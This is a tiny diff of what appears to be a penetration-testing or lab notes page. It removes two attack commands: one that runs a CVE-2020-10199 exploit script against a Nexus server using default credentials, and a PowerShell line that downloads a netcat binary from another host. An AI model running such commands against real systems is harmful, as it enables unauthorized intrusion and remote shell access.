@@ -1,11 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-python3 cve-2020-10199_cmd.py http://192.168.107.61:8081 nexus nexus
-```
 
-```
-powershell -c "iwr -uri http://192.168.45.199/nc64.exe -OutFile nc.exe"
 ```
 
 ```
